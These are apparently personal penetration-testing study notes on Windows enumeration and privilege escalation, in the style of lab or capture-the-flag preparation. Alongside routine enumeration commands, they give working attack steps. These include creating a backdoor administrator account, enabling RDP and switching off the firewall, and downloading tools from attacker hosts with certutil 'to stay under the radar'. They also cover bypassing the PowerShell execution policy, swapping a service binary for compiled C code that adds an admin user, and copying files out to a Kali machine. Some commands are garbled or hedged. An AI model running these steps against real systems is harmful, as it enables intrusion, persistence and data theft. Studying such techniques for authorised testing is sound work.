# Windows Enumeration

### Display Contents of a File

```bash
> Get-Content
> type
> cat
```


### Initial Access

There are several key pieces of information we should always obtain:

- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes

```bash
> powershell
> whoami
> whoami /groups
> net user
> net user steve
> Get-LocalUser
> Get-LocalGroup # Look at the different groups on the current workstation. Members of Remote Desktop Users can access the system with RDP, while members of Remote Management Users can access it with WinRM.
> Get-LocalGroupMember adminteam
# While it is crucial to know which users are privileged, it is also vital for us to understand which users can use RDP. Obtaining the credentials for one of these users may lead us to a GUI access, which often tremendously improves our means of interacting with the system.
> systeminfo # Note what version of Windows, and whether it is a 32 or 64 bit system
# Our goal in this next step is to identify all network interfaces, routes, and active network connections. Based on this information, we may identify new services or even access to other networks. This information may not directly lead us to elevated privileges, but they are vital to understand the machine's purpose and to obtain vectors to other systems and networks.
> ipconfig /all # Note whether DHCP is enables, the IP address, the Default Gateway, the Physical Address, subnet mask, and the DNS Servers
> route print #  The output of this command is useful to determine possible attack vectors to other systems or networks.
> netstat -ano # To list all active network connections. Use -a to display all active TCP connections as well as TCP and UDP ports, -n to disable name resolution, and -o to show the process ID for each connection. Look for port 3389 to be in use, if it is, you're not the only user on the system (hint: use MimiKatz to extract credentials). 
# Check all installed applications. We can query two registry keys to list both 32-bit and 64-bit applications in the Windows Registry with the Get-ItemProperty Cmdlet. We pipe the output to select with the argument displayname to only display the application's names. We begin with the 32-bit applications and then display the 64-bit applications.
> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname # You should check whether the applications on the system have public exploits
> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"
# However, the listed applications from Listing 15 may not be complete. For example, this could be due to an incomplete or flawed installation process. Therefore, we should always check 32-bit and 64-bit Program Files directories located in C:\. Additionally, we should review the contents of the Downloads directory of our user to find more potential programs.
> dir "C:\Program Files"
> dir "C:\Users\CurrentUser\Downloads"
# While it is important to create a list of installed applications on the target system, it is equally important to identify which of them are currently running. 
> Get-Process
> Get-Process NonStandardProcess | Select-Object Path # Get the path of the process
# Sensitive information may be stored in meeting notes, configuration files, or onboarding documents. With the information we gathered in the situational awareness process, we can make educated guesses on where to find such files.
> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
> Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
# If you get access to the machine through another user, then restart the file search, as permissions may have changed
> Get-ChildItem -Path C:\ -Include flag.txt -File -Recurse -ErrorAction SilentlyContinue | type # Great, but only for CTFs, probably shouldn't get used to it
```
### Powerview

*In the command prompt
```bash
# This will allow you to run scripts
powershell -ep bypass
...
# Load PowerView (once it's already installed)
> . ./PowerView.ps1
# See the structure
> Get-NetDomain
# Get the domain controller IP, possibly end target
> Get-NetDomainController
# Important Policies
> Get-DomainPolicy
# Get password policy, important insights while cracking passwords 
> (Get-DomainPolicy)."system access"
# Information about the user you have access to, can be a lot of information
> Get-NetUser
# Only pull down the usernames
> Get-NetUser | select samaccountname
# See when the users last changed their passwords
> Get-UserProperty -Properties pwdlastset
# See how many times each user has logged on, great way to identify honeypot accounts
> Get-UserProperty -Properties logoncount
# Get a ton of information about the computers
> Get-NetComputer -FullData # '| select {propertyName}' in order to nail down certain information, such as operating system
# See who are admins
> Get-NetGroupMember -GroupName *admin*
# Look through the different shares
> Invoke-ShareFinder
# Get the group policies, important one
> Get-NetGPO
# Narrowing down the above
> Get-NetGPO | select displayname, whenchanged

```

#### enum4linux

"As soon as you see that SMB is open, run enum4linux." It will try to enumerate SMB as much as it can.
```
enum4linux -A 123.123.123.123 -u user -p password # user and password are optional
```

#### smbclient

For enumerating SMB shares. I believe that you can also do it without credentials by putting an empty username and then maybe also an empty password, though maybe just the empty username. I may be getting this confused with cme smb. 

```bash
smbclient -L 123.123.123.123 -U domainname/username

# I believe that you can also do it without credentials by putting an empty username and then maybe also an empty password, though maybe just the empty username. I may be getting this confused with cme smb. 
cme smb -L -U '' 123.123.123.123
```

#### runas

Use this command to run as another user (if you have their credentials): 

```bash
>  runas /user:domainname\\username cmd.exe
```

Without access to a GUI we cannot use Runas since the password prompt doesn't accept our input in commonly used shells, such as our bind shell or WinRM. 

However, we can use a few other methods to access the system as another user when certain requirements are met. We can use WinRM or RDP to access the system if the user is a member of the corresponding groups. Alternatively, if the target user has the Log on as a batch job6 access right, we can schedule a task to execute a program of our choice as this user. Furthermore, if the target user has an active session, we can use PsExec from Sysinternals.

Since we have access to a GUI, let's use Runas in PowerShell to start cmd as user backupadmin. We'll enter the username as argument for /user: and the command we want to execute. Once we execute the command, a password prompt appears in which we'll enter the previously found password.

```bash
PS C:\Users\steve> runas /user:backupadmin cmd
Enter the password for backupadmin:
Attempting to start cmd as user "CLIENTWK220\backupadmin" ...
PS C:\Users\steve> 
```

Once the password is entered, a new command line window appears. The title of the new window states running as CLIENTWK220\backupadmin.

Use whoami to confirm the command line is working and we are indeed backupadmin.

#### schtasks

Allows you to see the scheduled tasks on your local box (once you have a shell/ssh session). The following is command useful as it will essentially answer the quesion, if we can exploit this, what kind of priviledges will we gain?

```bash
schtasks /query
...
schtasks /query /fo LIST /v /TN "FTP Backup"
```

#### type 

The Windows equivalent of cat.

#### findstr

The Windows equivalent of grep.

#### Recursively Search Through Directories (May only be in CMD)

```bash
dir /s/b file.txt
```

#### Recursively Search a User's Workstation

```bash
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

#### Create a Backdoor User

You can use this user to RDP into a session and obtain a GUI. This assumes that you are already NT Authority.
```bash
net user /add backdoor Password1
...
net localgroup administrators /add backdoor
...
# Enables RDP Connections
add "HTLM\SYSTEM\CurrentControlSet\Control\Terminal Server" \v "fDenyTSConnections" /t REG_DWORD /d 0 /f
...
# Disable the Firewalls
netsh advfirewall set allprofiles state off
...
# RDP In & Allow Clipboard Sharing
xfreerdp /v:ms01 /u:backdoor /p:Password1 +x clipboard /cert:ignore
```

#### Collecting Data for Bloodhound on Windows

We're using the SharpHound.ps1 from GitHub.
```bash
> . .\\SharpHound.ps1
> Invoke-BloodHound -CollectionMethod All -Domain MARVEL.local -ZipFileName outfile.zip
```

#### Check for GPP Vulnerability

Say that you have a shell in MetaSploit, you can background that shell and run the "smb_enum_gpp" module to check if there is the GPP vulnerability in the environment.

#### Recursively Downloading Files with SMB

```bash
> prompt off
> recurse on
> mget *
```

#### Create a Share

```bash
> net share public=c:\\users\\public /GRANT:Everyone,FULL
```

#### NTLM v NTLMv2

NTLM hashes can be passed, NTLMv2 hased CANNOT be passed.

#### Execution Policy Bypass - Per script basis

```bash
# Simply append to your script
-ExecutionPolicy Bypass
```

#### Execution Policy Bypass - Per User Basis

```bash
# Get the current execution policy for your current user
Get-ExecutionPolicy -Scope CurrentUser

# Attempt the modify the execution policy
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser

# Assure that the policy was changed
Get-ExecutionPolicy -Scope CurrentUser
```


#### Getting File from Windows Machine to Local - SCP

First, ensure the SSH service is running on your Kali machine:

```bash
sudo service ssh start
```

Then, from the Windows command line or PowerShell, transfer the file:

```powershell
scp C:\path\to\file.txt kali@<KALI_IP>:/path/to/save/
```

#### Decode Base64 in Powershell

```bash
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedText))
```

#### Windows' Curl

Stay under the radar and use certutil.exe on Windows to download files from the internet, or use the classic:
```bash
certutil.exe -f -urlcache http://123.123.123.123/winPEASx64.exe winpeas.exe

iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
```

## When WinPEAS Fails

Use winPEAS, and if the antivirus picks that up, then try other tools such as Seatbelt and Jaws.

#### Get the Running Services

When using a network logon such as WinRM or a bind shell, Get-CimInstance and Get-Service will result in a "permission denied" error when querying for services with a non-administrative user. Using an interactive logon such as RDP solves this problem.

```bash
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

#### Get Permissions of Running Services

The icacls utility outputs the corresponding principals and their permission mask.4 The most relevant permissions and their masks are listed below:
	Mask 	Permissions
	F 	Full access
	M 	Modify access
	RX 	Read and execute access
	R 	Read-only access
	W 	Write-only access

```bash
icacls "C:\xampp\mysql\bin\mysqld.exe"
```

### Elevate Priviledges of Running Service Binary

```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user overlord password123! /add");
  i = system ("net localgroup administrators overlord /add");
  
  return 0;
}
```

You need to cross-compile the code on our Kali machine with mingw-64.

```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

```bash
PS C:\Users\dave> iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe  

PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe

PS C:\Users\dave> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
```

Now you need to restart the service. You can try this command first, though it will likely fail.

```bash
net stop mysqld
```

If the service Startup Type is set to "Automatic", we may be able to restart the service by rebooting the machine.

Here's how you check:

```bash
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
```

In order to issue a reboot, our user needs to have the privilege SeShutDownPrivilege assigned. We can use whoami with /priv to get a list of all privileges.

```bash
whoami /priv
```

If you have the SeShutDownPrivilege, then restart the computer. 

```bash
shutdown /r /t 0
```

Once you're back, confirm that everything went as planned.

```bash
Get-LocalGroupMember administrators
```

We can nor use *RunAs* to obtain an interactive shell. In addition, we could also use msfvenom to create an executable file, starting a reverse shell.

If you run into trouble after priv escing, try running a powershell and cmd prompt as an administrator from the get. 

#### PowerUp.ps1 (Automated Alternative)

```bash
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
python3 -m http.server 80
```

```bash
# Upload the file
iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1

# This function displays services the current user can modify, such as the service binary or configuration files.
Get-ModifiableServiceFile
